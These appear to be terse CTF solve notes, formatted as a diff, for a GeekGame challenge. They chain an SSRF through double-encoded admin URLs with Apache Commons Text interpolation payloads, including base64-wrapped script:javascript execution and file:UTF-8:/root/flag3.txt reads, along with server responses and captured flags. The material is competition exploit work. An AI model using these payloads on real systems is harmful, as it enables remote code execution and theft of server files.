@@ -1,0 +1,25 @@
+https://prob08-3gj5krnz.geekgame.pku.edu.cn/admin/http%253a%252f%252flocalhost%253a8080/?type=PKU_GeekGame
+Endpoints:/bonus/source_bak
+
+https://prob08-3gj5krnz.geekgame.pku.edu.cn/admin/http%253a%252f%252flocalhost%253a8080%252fsource%255fbak
+
+https://prob08-3gj5krnz.geekgame.pku.edu.cn/admin/http%253a%252f%252flocalhost%253a8080%252fbonus%253f
+flag{f2d9cc00-180b-404d-8117-d2e712c2e57b} 恭喜你发现flag2，还有其他flag等待你发现哦"}
+
+https://prob08-iatmog3v.geekgame.pku.edu.cn/admin/http%253A%252F%252Flocalhost%253A8080%252Fbonus%253Fname%253DCommonsText%2526value%253D123?type=CommonsText
+{"type":"CommonsText","value":"123"}
+
+https://prob08-iatmog3v.geekgame.pku.edu.cn/admin/http%253A%252F%252Flocalhost%253A8080%252Fbonus%253F%2526?type=CommonsText&value=$&value=$%7bdate%3ayyyy%7d
+{"type":"CommonsText","value":"$,2022"}
+
+https://prob08-iatmog3v.geekgame.pku.edu.cn/admin/http%253A%252F%252Flocalhost%253A8080%252Fbonus%253F%2526?type=CommonsText&value=$&value=$%7bjava%3ayyyy%7d
+{"type":"CommonsText","value":"$,${:yyyy}"}
+
+${${base64Decoder:c2NyaXB0OmphdmFzY3JpcHQ6MyArIDQ=}}
+# script:javascript:3 + 4
+{"type":"CommonsText","value":"$,7"}
+
+file:UTF-8:/root/flag3.txt
+${${base64Decoder:ZmlsZTpVVEYtODovcm9vdC9mbGFnMy50eHQ=}}
+https://prob08-iatmog3v.geekgame.pku.edu.cn/admin/http%253A%252F%252Flocalhost%253A8080%252Fbonus%253F%2526?type=CommonsText&value=%24%7B%24%7Bbase64Decoder%3AZmlsZTpVVEYtODovcm9vdC9mbGFnMy50eHQ%3D%7D%7D
+{"type":"CommonsText","value":"flag{e088175f-71cd-4841-96fe-40092ddfdd23}"}
